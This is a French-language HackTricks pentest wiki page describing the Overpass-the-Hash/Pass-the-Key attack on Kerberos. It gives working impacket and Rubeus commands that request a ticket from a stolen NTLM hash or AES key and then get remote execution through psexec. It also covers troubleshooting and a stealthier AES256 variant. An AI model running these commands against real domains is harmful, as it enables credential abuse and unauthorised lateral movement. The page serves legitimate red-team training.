# Over Pass the Hash/Pass the Key

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Overpass The Hash/Pass The Key (PTK)

L'attaque **Overpass The Hash/Pass The Key (PTK)** est conçue pour des environnements où le protocole NTLM traditionnel est restreint, et où l'authentification Kerberos prend le pas. Cette attaque exploite le hachage NTLM ou les clés AES d'un utilisateur pour solliciter des tickets Kerberos, permettant un accès non autorisé aux ressources au sein d'un réseau.

Pour exécuter cette attaque, la première étape consiste à acquérir le hachage NTLM ou le mot de passe du compte de l'utilisateur ciblé. Une fois cette information sécurisée, un Ticket Granting Ticket (TGT) pour le compte peut être obtenu, permettant à l'attaquant d'accéder aux services ou machines auxquels l'utilisateur a des permissions.

Le processus peut être initié avec les commandes suivantes :
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Pour les scénarios nécessitant AES256, l'option `-aesKey [AES key]` peut être utilisée. De plus, le ticket acquis peut être utilisé avec divers outils, y compris smbexec.py ou wmiexec.py, élargissant ainsi la portée de l'attaque.

Les problèmes rencontrés tels que _PyAsn1Error_ ou _KDC cannot find the name_ sont généralement résolus en mettant à jour la bibliothèque Impacket ou en utilisant le nom d'hôte au lieu de l'adresse IP, garantissant la compatibilité avec le KDC Kerberos.

Une séquence de commandes alternative utilisant Rubeus.exe démontre un autre aspect de cette technique :
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Cette méthode reflète l'approche **Pass the Key**, en se concentrant sur la prise de contrôle et l'utilisation du ticket directement à des fins d'authentification. Il est crucial de noter que l'initiation d'une demande de TGT déclenche l'événement `4768: A Kerberos authentication ticket (TGT) was requested`, signifiant une utilisation par défaut de RC4-HMAC, bien que les systèmes Windows modernes préfèrent AES256.

Pour se conformer à la sécurité opérationnelle et utiliser AES256, la commande suivante peut être appliquée :
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Références

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
